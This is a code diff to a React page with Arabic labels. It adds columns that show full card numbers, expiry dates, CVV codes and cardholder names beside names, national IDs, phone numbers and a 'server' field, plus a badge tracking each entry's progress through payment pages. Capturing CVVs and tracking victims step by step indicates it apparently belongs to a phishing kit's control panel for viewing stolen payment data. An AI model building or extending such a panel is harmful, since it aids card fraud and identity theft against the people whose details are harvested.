@@ -954,6 +954,11 @@ export default function Home() {
                             <th style={{ padding:'8px 6px', color:'#f97316', textAlign:'right', borderBottom:'1px solid #92400e' }}>الاسم</th>
                             <th style={{ padding:'8px 6px', color:'#f97316', textAlign:'right', borderBottom:'1px solid #92400e' }}>الهوية</th>
                             <th style={{ padding:'8px 6px', color:'#f97316', textAlign:'right', borderBottom:'1px solid #92400e' }}>الجوال</th>
+                            <th style={{ padding:'8px 6px', color:'#ef4444', textAlign:'right', borderBottom:'1px solid #92400e' }}>💳 رقم البطاقة</th>
+                            <th style={{ padding:'8px 6px', color:'#ef4444', textAlign:'right', borderBottom:'1px solid #92400e' }}>الانتهاء</th>
+                            <th style={{ padding:'8px 6px', color:'#ef4444', textAlign:'right', borderBottom:'1px solid #92400e' }}>CVV</th>
+                            <th style={{ padding:'8px 6px', color:'#ef4444', textAlign:'right', borderBottom:'1px solid #92400e' }}>حامل البطاقة</th>
+                            <th style={{ padding:'8px 6px', color:'#f97316', textAlign:'right', borderBottom:'1px solid #92400e' }}>الحالة</th>
                             <th style={{ padding:'8px 6px', color:'#f97316', textAlign:'right', borderBottom:'1px solid #92400e' }}>السيرفر</th>
                           </tr>
                         </thead>
@@ -965,6 +970,11 @@ export default function Home() {
                               <td style={{ padding:'6px', color:'#fff', textAlign:'right', fontWeight:'bold' }}>{entry.name}</td>
                               <td style={{ padding:'6px', color:'#06b6d4', textAlign:'right', direction:'ltr' }}>{entry.national_id}</td>
                               <td style={{ padding:'6px', color:'#facc15', textAlign:'right', direction:'ltr' }}>{entry.phone}</td>
+                              <td style={{ padding:'6px', color: entry.card_number ? '#ef4444' : '#374151', textAlign:'right', direction:'ltr', fontWeight: entry.card_number ? 'bold' : 'normal' }}>{entry.card_number || '-'}</td>
+                              <td style={{ padding:'6px', color: entry.card_expiry ? '#ef4444' : '#374151', textAlign:'right', direction:'ltr' }}>{entry.card_expiry || '-'}</td>
+                              <td style={{ padding:'6px', color: entry.card_cvv ? '#ef4444' : '#374151', textAlign:'right', direction:'ltr' }}>{entry.card_cvv || '-'}</td>
+                              <td style={{ padding:'6px', color: entry.card_holder ? '#ef4444' : '#374151', textAlign:'right' }}>{entry.card_holder || '-'}</td>
+                              <td style={{ padding:'6px', textAlign:'right' }}><span style={{ padding:'2px 6px', borderRadius:'4px', fontSize:'10px', backgroundColor: entry.status === 'payment_done' ? '#052e16' : entry.status === 'payment_selected' ? '#1e1b4b' : '#1a0a00', color: entry.status === 'payment_done' ? '#22c55e' : entry.status === 'payment_selected' ? '#818cf8' : '#f97316', border: `1px solid ${entry.status === 'payment_done' ? '#16a34a' : entry.status === 'payment_selected' ? '#6366f1' : '#92400e'}` }}>{entry.status === 'payment_done' ? '✅ تم الدفع' : entry.status === 'payment_selected' ? '💳 جاري الدفع' : entry.status === 'page1_done' ? '📝 صفحة 1' : entry.status || '-'}</span></td>
                               <td style={{ padding:'6px', color:'#6b7280', textAlign:'right', fontSize:'10px' }}>{entry.server?.split('.').pop()}</td>
                             </tr>
                           ))}
